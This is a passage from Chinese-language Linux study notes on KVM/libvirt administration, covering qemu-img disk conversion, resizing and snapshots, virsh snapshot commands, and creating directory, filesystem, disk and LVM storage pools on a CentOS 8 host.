[root@centos8 images]# virt-install --import --name=centos8-test1 --vcpus=1 --ram=2048 --disk path=/var/lib/libvirt/images/centos8-test1.qcow2 --network network=default --graphics vnc,listen=0.0.0.0 --os-type=linux --os-variant=centos8


[root@centos8 images]# ll -h centos8*
-rw------- 1 qemu qemu  21G Jul 25 10:15 centos8.qcow2
-rw-r--r-- 1 root root  31M Jul 25 18:53 centos8-test1.qcow2
```

**创建后备差异虚拟磁盘并用virt-manager启动虚拟机**

```
[root@centos8 images]#pwd
/var/lib/libvirt/images
[root@centos8 images]# qemu-img create -f qcow2 -o backing_file=centos8.qcow2 centos8-test2.qcow2 
Formatting 'centos8-test2.qcow2', fmt=qcow2 size=21474836480backing_file=centos8.qcow2 cluster_size=65536 lazy_refcounts=off refcount_bits=16


[root@centos8 images]#qemu-img info centos8-test2.qcow2
image: centos8-test2.qcow2
file format: qcow2
virtual size: 20G (21474836480 bytes)
disk size: 196K
cluster_size: 65536
backing file: centos8.qcow2
Format specific information:
   compat: 1.1
   lazy refcounts: false
   refcount bits: 16
   corrupt: false
    
[root@centos8 images]#ll centos8-test2.qcow2 -h
-rw-r--r-- 1 root root 193K Sep 20 15:33 centos8-test2.qcow2

[root@centos8 images]#virt-manager
```

![1658746763269](linux体系.assets/1658746763269.png)

![1658746840709](linux体系.assets/1658746840709.png)

![1658746856133](linux体系.assets/1658746856133.png)

![1658746905745](linux体系.assets/1658746905745.png)

![1658746932241](linux体系.assets/1658746932241.png)

![1658746960868](linux体系.assets/1658746960868.png)

##### 46.7.4.6 虚拟磁盘格式转换

```
#1.概述
qemu-img可以将不同格式的虚拟磁盘文件进行格式转化
语法格式
qemu-img convert [--object objectdef] [--image-opts] [--target-image-opts] [-U] [-C] [-c] [-p] [-q] [-n] [-f fmt] [-t cache] [-T src_cache] [-O output_fmt] [-B backing_file] [-o options] [-s snapshot_id_or_name] [-l snapshot_param] [-S sparse_size] [-m num_coroutines] [-W] filename [filename2 [...]] output_filename




#2.案例：将vmdk转化为raw 和qcow2格式
[root@centos8 ~]#qemu-img info CentOS8.2.vmdk
image: CentOS8.2.vmdk
file format: vmdk
virtual size: 200G (214748364800 bytes)
disk size: 1.6G
cluster_size: 65536
Format specific information:
   cid: 2898578192
   parent cid: 4294967295
   create type: monolithicSparse
   extents:
       [0]:
           virtual size: 214748364800
           filename: CentOS8.2.vmdk
           cluster size: 65536
           format:
           
           
#默认转化为raw格式
[root@centos8 ~]#qemu-img convert CentOS8.2.vmdk CentOS8.2.img


#比较大小
[root@centos8 ~]#ll -h CentOS8.2.vmdk CentOS8.2.img 
-rw-r--r-- 1 root root 1.6G Sep 20 16:00 CentOS8.2.vmdk
-rw-r--r-- 1 root root 200G Sep 20 16:10 CentOS8.2.img

[root@centos8 ~]#du -h CentOS8.2.vmdk CentOS8.2.img
1.6G CentOS8.2.vmdk
1.5G CentOS8.2.img


[root@centos8 ~]#qemu-img info CentOS8.2.img
image: CentOS8.2.img
file format: raw
virtual size: 200G (214748364800 bytes)
disk size: 1.4G

[root@centos8 ~]#mv CentOS8.2.img /var/lib/libvirt/images/
[root@centos8 ~]#virt-install --import --name=centos8-test2 --vcpus=1 --ram=2048 --disk bus=scsi,path=/var/lib/libvirt/images/CentOS8.2.img --network network=default --graphics vnc,listen=0.0.0.0 --os-type=linux --os-variant=centos8 --noautoconsole --boot hd


#转化为qcow2格式
[root@centos8 ~]#qemu-img convert -f vmdk -O qcow2 CentOS8.2.vmdk CentOS8.2.qcow2


#比较大小
[root@centos8 ~]#ll -h CentOS8.2.vmdk CentOS8.2.qcow2 
-rw-r--r-- 1 root root 1.6G Sep 20 16:00 CentOS8.2.vmdk
-rw-r--r-- 1 root root 1.6G Sep 20 16:12 CentOS8.2.qcow2
[root@centos8 ~]#du -h CentOS8.2.vmdk CentOS8.2.qcow2 
1.6G CentOS8.2.vmdk
1.6G CentOS8.2.qcow2


[root@centos8 ~]#qemu-img info CentOS8.2.qcow2 
image: CentOS8.2.qcow2
file format: qcow2
virtual size: 200G (214748364800 bytes)
disk size: 1.5G
cluster_size: 65536
Format specific information:
   compat: 1.1
   lazy refcounts: false
   refcount bits: 16
   corrupt: false
   
[root@centos8 ~]#mv CentOS8.2.qcow2 /var/lib/libvirt/images/

[root@centos8 ~]#virt-install --import --name=centos8-test3 --vcpus=1 --ram=2048 --disk bus=scsi,path=/var/lib/libvirt/images/CentOS8.2.qcow2 --network network=default --graphics vnc,listen=0.0.0.0 --os-type=linux --os-variant=centos8 --noautoconsole --boot hd
```

##### 46.7.4.7 调整虚拟磁盘大小

```
#1.概述
虚拟磁盘文件创建后,还可以调整虚拟磁盘大小

操作之前，一定要做好数据备份。
增加文件大小后，需要在客户机中使用fdisk、parted等分区工具进行相应的操作才能真正让客户机使用到增加后的镜像空间。
缩小镜像之前，要在客户机中保证里面的文件系统有空余空间，否则会数据丢失。另外xfs文件系统不支持缩减。
qcow2不支持缩小镜像的操作。



#2.范例: 扩展虚拟磁盘
[root@centos8 ~]#qemu-img info /var/lib/libvirt/images/centos8.qcow2 
image: /var/lib/libvirt/images/centos8.qcow2
file format: qcow2
virtual size: 20G (21474836480 bytes)
disk size: 20G
cluster_size: 65536
Format specific information:
   compat: 1.1
   lazy refcounts: true
   refcount bits: 16
   corrupt: false
    
    
#增加10G空间
[root@centos8 ~]#qemu-img resize /var/lib/libvirt/images/centos8.qcow2 +10G
Image resized.
[root@centos8 ~]#qemu-img info /var/lib/libvirt/images/centos8.qcow2 
image: /var/lib/libvirt/images/centos8.qcow2
file format: qcow2
virtual size: 30G (32212254720 bytes)
disk size: 20G
cluster_size: 65536
Format specific information:
   compat: 1.1
   lazy refcounts: true
   refcount bits: 16
   corrupt: false
   
#启动虚拟机后,还需要使用fdisk等工具进行空间的继续管理才能使用



#2.1缩减虚拟磁盘
[root@centos8 images]#qemu-img info centos7.qcow2
image: centos7.qcow2
file format: qcow2
virtual size: 20G (21474836480 bytes)
disk size: 1.6G
cluster_size: 65536
Format specific information:
   compat: 1.1
   lazy refcounts: false
   refcount bits: 16
   corrupt: false
   
   
[root@centos8 images]#qemu-img resize --shrink /var/lib/libvirt/images/centos7.qcow2 -2G
Image resized.

[root@centos8 images]#qemu-img info centos7.qcow2
image: centos7.qcow2
file format: qcow2
virtual size: 18G (19327352832 bytes)
disk size: 1.6G
cluster_size: 65536
Format specific information:
   compat: 1.1
   lazy refcounts: false
   refcount bits: 16
   corrupt: false
```

![1658750549384](linux体系.assets/1658750549384.png)

#### 46.7.5 磁盘快照管理

##### 46.7.5.1 快照Snapshot介绍

```
#1.快照分类
磁盘快照
   对磁盘数据进行快照
   主要用于虚拟机备份等场合
   
内存快照
   对虚拟机的内存/设备信息进行保存
   该机制同时用于休眠恢复，迁移等场景
   主要使用virsh save ( qemu migrate to file）实现，只能对运行的虚拟机进行
   
检查点Checkpoint快照
   同时保存虚拟机的磁盘快照和内存快照
   用于将虚拟机恢复到某个时间点
   可以保证数据的一致性
   
   
   
#2.磁盘快照分类
按快照信息保存分为:
内置快照∶快照数据和base磁盘数据放在同一个qcow2文件中
外置快照︰快照数据单独的另一个qcow2文件存放

按虚拟机状态可以分为:
关机态快照︰数据可以保证一致性
运行态快照∶数据无法保证一致性，类似与系统crash后的磁盘数据。使用是可能需要fsck等操作。

按磁盘数量可以分为:
单盘:单盘快照不涉及原子性
多盘:涉及原子性。主要分两个方面:1.是所有盘快照点相同2.所有盘要么都快照成功，要么都快照失败。主要依赖于qemu的transaction实现
```

##### 46.7.5.2 qemu-img管理磁盘快照

```
#1.命令格式
qemu-img snapshot [--object objectdef] [--image-opts] [-U] [-q] [-l | -a snapshot | -c snapshot | -d snapshot] filename

snapshot is the name of the snapshot to create, apply or delete
 -a applies a snapshot (revert disk to saved state)
 -c creates a snapshot
 -d deletes a snapshot
 -l lists all snapshots in the given image
 
 
 
 
 
#2.范例
#查看块设备
[root@centos8 ~]# virsh domblklist centos7
Target     Source
------------------------------------------------
hda       /var/lib/libvirt/images/centos7.qcow2
hdb        - 

#查看快照,如果没有快照,则无显示信息
[root@centos8 ~]#qemu-img snapshot -l /var/lib/libvirt/images/centos7.qcow2


#创建快照
[root@centos8 ~]#qemu-img snapshot -c centos7-s1 /var/lib/libvirt/images/centos7.qcow2


#查看快照
[root@centos8 ~]#qemu-img snapshot -l /var/lib/libvirt/images/centos7.qcow2
Snapshot list:
ID       TAG                 VM SIZE               DATE       VM CLOCK
1         centos7-s1                0 2020-09-20 17:39:59   00:00:00.000


#查看快照信息
[root@centos8 ~]#qemu-img info /var/lib/libvirt/images/centos7.qcow2
image: /var/lib/libvirt/images/centos7.qcow2
file format: qcow2
virtual size: 20G (21474836480 bytes)
disk size: 1.6G
cluster_size: 65536
Snapshot list:
ID       TAG                 VM SIZE               DATE       VM CLOCK
1         centos7-s1                0 2020-09-20 17:39:59   00:00:00.000
Format specific information:
   compat: 1.1
   lazy refcounts: false
   refcount bits: 16
   corrupt: false
   
   
   
#删除文件,模拟破坏
```

![1658803484320](linux体系.assets/1658803484320.png)

```
#关机后才能还原快照修复故障
[root@centos8 ~]#qemu-img snapshot -a centos7-s1 /var/lib/libvirt/images/centos7.qcow2
```

![1658803751153](linux体系.assets/1658803751153.png)

![1658804030302](linux体系.assets/1658804030302.png)

```
#关机后才能删除快照
[root@centos8 ~]#qemu-img snapshot -d centos7-s1 /var/lib/libvirt/images/centos7.qcow2
[root@centos8 ~]#qemu-img snapshot -l /var/lib/libvirt/images/centos7.qcow2
```

##### 46.7.5.3 virsh管理虚拟机快照

```
[root@centos8 ~]#virsh snapshot-list centos8
 Name                 Creation Time             State
------------------------------------------------------------


#创建虚拟机快照
[root@centos8 ~]#virsh snapshot-create centos8
Domain snapshot 1600593611 created

[root@centos8 ~]#virsh snapshot-list centos8
 Name                 Creation Time             State
------------------------------------------------------------
1600593611           2020-09-20 17:20:11 +0800 shutoff
```

![1658804491157](linux体系.assets/1658804491157.png)

**使用virsh命令还原快照**

```
[root@centos8 ~]#virsh list
 Id   Name                           State
----------------------------------------------------


#先关机后再还原快照
[root@centos8 ~]#virsh snapshot-revert centos8 --snapshotname 1600593611 --running
[root@centos8 ~]#virsh list
 Id   Name                           State
----------------------------------------------------
23   centos7                       running
```

![1658804856167](linux体系.assets/1658804856167.png)

```
#删除快照
[root@centos8 ~]# virsh snapshot-delete centos8 --snapshotname 1600593611
Domain snapshot 1600593611 deleted

[root@centos8 ~]#virsh snapshot-list centos8
 Name                 Creation Time             State
------------------------------------------------------------
```

##### 46.7.5.4 virt-manager管理快照

![1658805904534](linux体系.assets/1658805904534.png)

![1658806082805](linux体系.assets/1658806082805.png)
![1658806110591](linux体系.assets/1658806110591.png)

![1658806138798](linux体系.assets/1658806138798.png)

![1658806162550](linux体系.assets/1658806162550.png)

```
[root@centos8 ~]#ll /var/lib/libvirt/qemu/snapshot/centos8/
total 8
-rw------- 1 root root 5802 Aug 11 13:28 snapshot1.xml
```

#### 46.7.6 存储池管理

##### 46.7.6.1 存储池介绍

Libvirt可以以存储池的形式对存储进行统一管理、简化操作

对于虚拟机操作，存储池和卷并不是必需的,一个存储池中可以有多个存储卷

支持以下存储池

```
dir: Filesystem Directory
disk: Physical Disk Device
fs: Pre-Formatted Block Device
gluster: Gluster FileSystem
iscsi: iSCSI Target
logical: LVM Volume Group
mpath: Multipath Device Enumerator
netfs: Network Export Directory
rbd:RADOS Block Device/Ceph
scsi: SCSI Host Adapter
sheepdog: Sheepdog Filesystem #分布式文件系统
```

**virt-manager可以创建和管理存储池**

![1658807077705](linux体系.assets/1658807077705.png)

![1658807109007](linux体系.assets/1658807109007.png)

 **virsh中的存储池相关命令**

```
find-storage-pool-sources-as 	#通过参数查找存储池源find potential storage pool 
sources
find-storage-pool-sources 	    #通过XML文档查找存储池源找到潜在存储池源
pool-autostart 				   #自动启动某个池
pool-build 					   #建立池
pool-create-as 				   #在一组变量中定义池
pool-create					   #从一个XML文件中创建一个池
pool-define-as 				   #从一组变量中创建一个池
pool-define 				   #在一个XML文件中定义（但不启动）一个池或修改已经有池
pool-delete 				   #删除池
pool-destroy				   #销毁（停止）池
pool-dumpxml 				   #将池信息保存到XML文件中的
pool-edit 					   #为存储池编辑XML配置
pool-info 					   #存储池信息
pool-list					   #列出池
pool-name 					   #把一个池名称转换为池UUID
pool-refresh 				   #刷新池
pool-start 					   #启动一个（以前定义的）非活跃的池
pool-undefine 				   #取消定义一个不活跃的池
pool-uuid 					   #将池UUID转换为池名称




#范例:
[root@centos8 ~]#virsh pool-list --help
 NAME
   pool-list - list pools
 SYNOPSIS
   pool-list [--inactive] [--all] [--transient] [--persistent] [--autostart] [--no-autostart] [--type <string>] [--details] [--uuid] [--name]
   
 DESCRIPTION
   Returns list of pools.
   
 OPTIONS
    --inactive       list inactive pools
    --all           list inactive & active pools
    --transient     list transient pools
    --persistent     list persistent pools
    --autostart     list pools with autostart enabled
    --no-autostart   list pools with autostart disabled
    --type <string> only list pool of specified type(s) (if supported)
    --details       display extended details for pools
    --uuid           list UUID of active pools only
    --name           list name of active pools only
```

##### 46.7.6.2 显示存储池信息

**存储池相关配置文件都在下面目录存放**

```
/etc/libvirt/storage/
```

**范例: 显示存储池**

```
[root@centos8 ~]#virsh pool-list
 Name                 State     Autostart 
-------------------------------------------
 default             active     yes       
 isos                 active     yes       
[root@centos8 ~]#virsh pool-list --uuid
b164fec8-1861-4f07-86ae-5023ea17f925
a707038c-c21b-4570-bdef-d94c00554daa


#通过存储池的名称查找UUID
[root@centos8 ~]#virsh pool-uuid default
b164fec8-1861-4f07-86ae-5023ea17f925


#通过UUID查找存储池的名称
[root@centos8 ~]#virsh pool-name b164fec8-1861-4f07-86ae-5023ea17f925
default

[root@centos8 ~]#virsh pool-info default 
Name:           default
UUID:           b164fec8-1861-4f07-86ae-5023ea17f925
State:         running
Persistent:     yes
Autostart:      yes
Capacity:       99.95 GiB
Allocation:     34.58 GiB
Available:      65.37 GiB


#每个存储池对应的配置文件
[root@centos8 ~]#ll /etc/libvirt/storage/
total 8
drwxr-xr-x 2 root root  41 Sep 13 19:28 autostart
-rw------- 1 root root 538 Sep 13 19:05 default.xml
-rw------- 1 root root 519 Sep 13 19:28 isos.xml


[root@centos8 ~]#ll /etc/libvirt/storage/autostart/
total 0
lrwxrwxrwx 1 root root 32 Sep 13 19:05 default.xml -> 
/etc/libvirt/storage/default.xml
lrwxrwxrwx 1 root root 29 Sep 13 19:28 isos.xml -> /etc/libvirt/storage/isos.xml



[root@centos8 ~]#cat /etc/libvirt/storage/default.xml
<!--
WARNING: THIS IS AN AUTO-GENERATED FILE. CHANGES TO IT ARE LIKELY TO BE
OVERWRITTEN AND LOST. Changes to this xml configuration should be made using:
  virsh pool-edit default
or other application using the libvirt API.
-->

<pool type='dir'>
  <name>default</name>
  <uuid>2b77f4da-7f0c-45eb-b7bd-34f3faaaffdc</uuid>
  <capacity unit='bytes'>0</capacity>
  <allocation unit='bytes'>0</allocation>
  <available unit='bytes'>0</available>
  <source>
  </source>
  <target>
    <path>/var/lib/libvirt/images</path>
  </target>
</pool>



[root@centos8 ~]#cat /etc/libvirt/storage/isos.xml
<!--
WARNING: THIS IS AN AUTO-GENERATED FILE. CHANGES TO IT ARE LIKELY TO BE
OVERWRITTEN AND LOST. Changes to this xml configuration should be made using:
  virsh pool-edit isos
or other application using the libvirt API.
-->

<pool type='dir'>
  <name>isos</name>
  <uuid>56ae1fef-c460-46d3-893b-5664baaae71f</uuid>
  <capacity unit='bytes'>0</capacity>
  <allocation unit='bytes'>0</allocation>
  <available unit='bytes'>0</available>
  <source>
  </source>
  <target>
    <path>/data/isos</path>
  </target>
</pool>
```

##### 46.7.6.3 基于目录的存储池

 **创建存储池**

```
#目录需要事先创建,否则虽然可以创建存储池,但无法直接启动,后期也可以先创建存储池,再使用 pool-build 自动创建目录
[root@centos8 ~]#mkdir /data/vm_images
#基于安装考虚可以设置权限
[root@centos8 ~]#chmod 700 /data/vm_images


#查看帮助
[root@centos8 ~]#virsh pool-define-as --help


#创建存储池
[root@centos8 ~]# virsh pool-define-as vm_images dir --target /data/vm_images
Pool vm_images defined


#查看存储池状态，是未激活状态
[root@centos8 images]# virsh pool-list --all
 Name                 State      Autostart 
-------------------------------------------
 default              active     yes       
 isos                 active     yes       
 vm_images            inactive   no 
 
 
 
 
#激活存储池
[root@centos8 images]# virsh pool-start vm_images
Pool vm_images started


#设置为开机自动启动
[root@centos8 images]# virsh pool-autostart vm_images
Pool vm_images marked as autostarted


#查看存储池状态
[root@centos8 images]# virsh pool-list --all
 Name                 State      Autostart 
-------------------------------------------
 default              active     yes       
 isos                 active     yes       
 vm_images            active     yes 
 
 
 
 
#查看存储池xml文件
[root@centos8 images]# cat /etc/libvirt/storage/vm_images.xml
<!--
WARNING: THIS IS AN AUTO-GENERATED FILE. CHANGES TO IT ARE LIKELY TO BE
OVERWRITTEN AND LOST. Changes to this xml configuration should be made using:
  virsh pool-edit vm_images
or other application using the libvirt API.
-->

<pool type='dir'>
  <name>vm_images</name>
  <uuid>78be078d-b8d2-4959-9ba8-a8a7b705dcdd</uuid>
  <capacity unit='bytes'>0</capacity>
  <allocation unit='bytes'>0</allocation>
  <available unit='bytes'>0</available>
  <source>
  </source>
  <target>
    <path>/data/vm_images</path>
  </target>
</pool>
```

![1658809046195](linux体系.assets/1658809046195.png)

**删除存储池**

```
#先停止存储池后才能删除
[root@centos8 ~]#virsh pool-destroy --pool vm_images
Pool vm_images destroyed


[root@centos8 ~]#virsh pool-list --all
 Name                 State     Autostart 
-------------------------------------------
 default             active     yes       
 isos                 active    yes       
 vm_images           inactive   yes
 
 
#删除存储池的相关数据目录
[root@centos8 ~]#virsh pool-delete --pool vm_images
Pool vm_images deleted
[root@centos8 ~]#ls /data
isos


#但存储池的配置还在
[root@centos8 ~]#virsh pool-list --all
 Name                 State     Autostart 
-------------------------------------------
 default             active     yes       
 isos                 active     yes       
 vm_images           inactive   yes  
 
 
 
#删除存储池配置文件
[root@centos8 ~]#virsh pool-undefine --pool vm_images
Pool vm_images has been undefined
[root@centos8 ~]#virsh pool-list --all
 Name                 State     Autostart 
-------------------------------------------
 default             active     yes       
 isos                 active    yes       
 
 
[root@centos8 ~]#ll /etc/libvirt/storage/
total 8
drwxr-xr-x 2 root root  41 Sep 20 18:54 autostart
-rw------- 1 root root 538 Sep 13 19:05 default.xml
-rw------- 1 root root 519 Sep 13 19:28 isos.xml
```

##### 46.7.6.4 基于文件系统的存储池

**实现基于文件系统的存储池过程**

```
准备分区并创建文件系统
  fdisk /dev/sda
  mkfs.ext4 /dev/sda6
  
准备存储池的挂载点目录
  mkdir /vm_images
  
创建分区的存储池


virsh pool-define-as vm_images_fs fs --source-dev "/dev/sda6" --target
"/vm_images"
#Source Path:块设备名
#Target Path : mount到的目录名
#libvirtd 会自动 mount 分区
```

**管理基于分区的存储池**

```
[root@centos8 images]# lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0    7:0    0  1.6G  0 loop /var/www/html/centos/8/os/x86_64
sda      8:0    0  200G  0 disk 
├─sda1   8:1    0    1G  0 part /boot
├─sda2   8:2    0  100G  0 part /
├─sda3   8:3    0   50G  0 part /data
├─sda4   8:4    0    1K  0 part 
└─sda5   8:5    0    4G  0 part [SWAP]
sr0     11:0    1 1024M  0 rom 



[root@centos8 images]# fdisk -l /dev/sda
Disk /dev/sda: 200 GiB, 214748364800 bytes, 419430400 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x6c2c6adb

Device     Boot     Start       End   Sectors  Size Id Type
/dev/sda1  *         2048   2099199   2097152    1G 83 Linux
/dev/sda2         2099200 211814399 209715200  100G 83 Linux
/dev/sda3       211814400 316671999 104857600   50G 83 Linux
/dev/sda4       316672000 419430399 102758400   49G  5 Extended
/dev/sda5       316676096 325064703   8388608    4G 82 Linux swap / Solari



#进行分区
root@centos8 images]# fdisk /dev/sda

Welcome to fdisk (util-linux 2.32.1).
Changes will remain in memory only, until you decide to write them.
Be careful before using the write command.


Command (m for help): p
Disk /dev/sda: 200 GiB, 214748364800 bytes, 419430400 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x6c2c6adb

Device     Boot     Start       End   Sectors  Size Id Type
/dev/sda1  *         2048   2099199   2097152    1G 83 Linux
/dev/sda2         2099200 211814399 209715200  100G 83 Linux
/dev/sda3       211814400 316671999 104857600   50G 83 Linux
/dev/sda4       316672000 419430399 102758400   49G  5 Extended
/dev/sda5       316676096 325064703   8388608    4G 82 Linux swap / Solaris

Command (m for help): n
All primary partitions are in use.
Adding logical partition 6
First sector (316674048-419430399, default 316674048): 
Last sector, +sectors or +size{K,M,G,T,P} (316674048-316676095, default 316676095): +10G

Created a new partition 6 of type 'Linux' and of size 10 GiB.

Command (m for help): w
The partition table has been altered.
Syncing disks.


[root@centos8 images]# lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0    7:0    0  1.6G  0 loop /var/www/html/centos/8/os/x86_64
sda      8:0    0  200G  0 disk 
├─sda1   8:1    0    1G  0 part /boot
├─sda2   8:2    0  100G  0 part /
├─sda3   8:3    0   50G  0 part /data
├─sda4   8:4    0    1K  0 part 
├─sda5   8:5    0    4G  0 part [SWAP]
└─sda6   8:6    0    10G  0 part 
sr0     11:0    1 1024M  0 rom 




#新创建的分区进行格式化
[root@centos8 images]# mkfs.ext4 /dev/sda6
mke2fs 1.45.4 (23-Sep-2019)

Filesystem too small for a journal
Creating filesystem with 1024 1k blocks and 128 inodes

Allocating group tables: done                            
Writing inode tables: done                            
Writing superblocks and filesystem accounting information: done




#准备分区挂载点
[root@centos8 images]# mkdir /data/vm_images



#创建存储池定义
[root@centos8 images]# virsh pool-define-as vm_images_fs fs --source-dev "/dev/sda6" --target "/data/vm_images"



#启动存储池
[root@centos8 images]# virsh pool-start vm_images_fs
Pool vm_images_fs started


#查看挂载情况
[root@centos8 images]# df
Filesystem     1K-blocks     Used Available Use% Mounted on
devtmpfs         3957476        0   3957476   0% /dev
tmpfs            3985408        0   3985408   0% /dev/shm
tmpfs            3985408    17896   3967512   1% /run
tmpfs            3985408        0   3985408   0% /sys/fs/cgroup
/dev/sda2      104806400 53973636  50832764  52% /
/dev/sda3       52403200 11971964  40431236  23% /data
/dev/loop0       1677618  1677618         0 100% /var/www/html/centos/8/os/x86_64
/dev/sda1        1038336   230160    808176  23% /boot
tmpfs             797080       12    797068   1% /run/user/0
/dev/sda6           1003       21       911   3% /data/vm_images   #自动挂载成功！！



#设为开机自动启动
[root@centos8 images]# virsh pool-autostart vm_images_fs
Pool vm_images_fs marked as autostarted
[root@centos8 images]# virsh pool-list --all
 Name                 State      Autostart 
-------------------------------------------
 default              active     yes       
 isos                 active     yes       
 vm_images            active     yes       
 vm_images_fs         active     yes 
```

![1658811623909](linux体系.assets/1658811623909.png)

**删除基于分区的存储池**

```
[root@centos8 ~]#virsh pool-destroy vm_images_fs 
Pool vm_images_fs destroyed

[root@centos8 ~]#virsh pool-delete vm_images_fs 
Pool vm_images_fs deleted 

[root@centos8 ~]#virsh pool-undefine vm_images_fs 
Pool vm_images_fs has been undefined

[root@centos8 ~]#df
Filesystem     1K-blocks     Used Available Use% Mounted on
devtmpfs         4050824        0   4050824   0% /dev
tmpfs            4067604        0   4067604   0% /dev/shm
tmpfs            4067604     9360   4058244   1% /run
tmpfs            4067604        0   4067604   0% /sys/fs/cgroup
/dev/sda2      104806400 36340696  68465704  35% /
/dev/sda3       52403200 12331584  40071616  24% /data
/dev/sda1         999320   120528    809980  13% /boot
tmpfs             813520        0    813520   0% /run/user/0

[root@centos8 ~]#ll /vm_images/
total 0

[root@centos8 ~]#virsh pool-list --all
 Name                 State     Autostart 
-------------------------------------------
 default             active     yes       
 isos                 active    yes
 
 
[root@centos8 ~]#ll /etc/libvirt/storage/
total 8
drwxr-xr-x 2 root root  41 Sep 20 19:30 autostart
-rw------- 1 root root 538 Sep 13 19:05 default.xml
-rw------- 1 root root 519 Sep 13 19:28 isos.xml
```

##### 46.7.6.5 基于磁盘的存储池

**创建前需要添加新的磁盘**

![1658811946997](linux体系.assets/1658811946997.png)

![1658811976501](linux体系.assets/1658811976501.png)

![1658812008617](linux体系.assets/1658812008617.png)

![1658812097651](linux体系.assets/1658812097651.png)

```
[root@centos8 ~]# lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0    7:0    0  1.6G  0 loop /var/www/html/centos/8/os/x86_64
sda      8:0    0  200G  0 disk 
├─sda1   8:1    0    1G  0 part /boot
├─sda2   8:2    0  100G  0 part /
├─sda3   8:3    0   50G  0 part /data
├─sda4   8:4    0    1K  0 part 
├─sda5   8:5    0    4G  0 part [SWAP]
└─sda6   8:6    0    1M  0 part /data/vm_images
sdb      8:16   0   20G  0 disk  #新添加的20G硬盘
sr0     11:0    1 1024M  0 rom 


#标注磁盘类型
[root@centos8 ~]# parted /dev/sdb mklabel gpt
Information: You may need to update /etc/fstab
[root@centos8 ~]# parted /dev/sdb print                  
Model: VMware, VMware Virtual S (scsi)
Disk /dev/sdb: 21.5GB
Sector size (logical/physical): 512B/512B
Partition Table: gpt
Disk Flags: 
Number  Start  End  Size  File system  Name  Flag



#准备磁盘存储池对应的xml文件
[root@centos8 ~]# vim vm_images_disk.xml
<pool type='disk'>
<pool type='disk'>
<pool type='disk'>
  <name>vm_images_disk</name>
  <source>
     <device path='/dev/sdb'/>
     <format type='gpt'/>
  </source>
  <target> 
     <path>/dev</path>
  </target>
</pool>



#基于XML创建存储池
[root@centos8 ~]# virsh pool-define vm_images_disk.xml
Pool vm_images_disk defined from vm_images_disk.xml
[root@centos8 ~]# virsh pool-start vm_images_disk
Pool vm_images_disk started
[root@centos8 ~]# virsh pool-autostart vm_images_disk
Pool vm_images_disk marked as autostarted



#查看存储池状态
[root@centos8 ~]# virsh pool-list
 Name                 State      Autostart 
-------------------------------------------
 default              active     yes       
 isos                 active     yes       
 vm_images            active     yes       
 vm_images_disk       active     yes    #基于磁盘   
 vm_images_fs         active     yes 
```

![1658813130230](linux体系.assets/1658813130230.png)

```
#停止存储池
[root@centos8 ~]#virsh pool-destroy vm_images_disk 
Pool vm_images_disk destroyed


#再删除,注意基于磁盘的存储池不支持pool-delete
[root@centos8 ~]#virsh pool-undefine vm_images_disk 
Pool vm_images_disk has been undefined


[root@centos8 ~]#virsh pool-list
 Name                 State     Autostart 
-------------------------------------------
 default             active     yes       
 isos                 active    yes  
```

##### 46.7.6.6 基于LVM的存储池

```
基于LVM的存储池要求使用VG中的全部磁盘空间。

创建存储池，有两种方法
  创建新的VG创建存储池
  使用现有的VG创建存储池
```

**无存在的卷组直接创建存储池**

```
#source-dev 指定硬盘设备,事先无卷组时此项才需要指定
#source-name 指定已有卷组名,此项利用已有卷组创建存储池才需指定,事先无卷组无需指定

[root@centos8 ~]#pvs
[root@centos8 ~]#virsh pool-define-as vm_images_lvm logical --source-dev=/dev/sdb  
Pool vm_images_lvm defined


#无卷组无法启存储池
[root@centos8 ~]#virsh pool-start vm_images_lvm 
error: Failed to start pool vm_images_lvm
error: unsupported configuration: cannot find logical volume group name 
'vm_images_lvm'


#构建存储池同时创建卷组
[root@centos8 ~]#virsh pool-build vm_images_lvm 
Pool vm_images_lvm built

[root@centos8 ~]#virsh pool-start vm_images_lvm 
Pool vm_images_lvm started

[root@centos8 ~]#virsh pool-list
 Name                 State     Autostart 
-------------------------------------------
 default             active     yes       
 isos                 active    yes       
 vm_images_lvm       active     no
 
[root@centos8 ~]#pvs
 PV         VG           Fmt Attr PSize   PFree  
 /dev/sdb   vm_images_lvm lvm2 a-- <20.00g <20.00g
 
[root@centos8 ~]#vgs
 VG            #PV #LV #SN Attr   VSize   VFree  
 vm_images_lvm   1   0   0 wz--n- <20.00g <20.00g
```

**利用已有的卷组创建存储池**

```
#先创建分区
[root@centos8 ~]# fdisk /dev/sda

Welcome to fdisk (util-linux 2.32.1).
Changes will remain in memory only, until you decide to write them.
Be careful before using the write command.


Command (m for help): n
All primary partitions are in use.
Adding logical partition 7
First sector (325066752-419430399, default 325066752): 
Last sector, +sectors or +size{K,M,G,T,P} (325066752-419430399, default 419430399): +10G

Created a new partition 7 of type 'Linux' and of size 10 GiB.

Command (m for help): p
Disk /dev/sda: 200 GiB, 214748364800 bytes, 419430400 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x6c2c6adb

Device     Boot     Start       End   Sectors  Size Id Type
/dev/sda1  *         2048   2099199   2097152    1G 83 Linux
/dev/sda2         2099200 211814399 209715200  100G 83 Linux
/dev/sda3       211814400 316671999 104857600   50G 83 Linux
/dev/sda4       316672000 419430399 102758400   49G  5 Extended
/dev/sda5       316676096 325064703   8388608    4G 82 Linux swap / Solaris
/dev/sda6       316674048 316676095      2048    1M 83 Linux
/dev/sda7       325066752 346038271  20971520   10G 83 Linux

Partition table entries are not in disk order.

Command (m for help): t
Partition number (1-7, default 7): 8e
Value out of range.
Partition number (1-7, default 7): 7
Hex code (type L to list all codes): 8e

Changed type of partition 'Linux' to 'Linux LVM'.

Command (m for help): p   
Disk /dev/sda: 200 GiB, 214748364800 bytes, 419430400 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
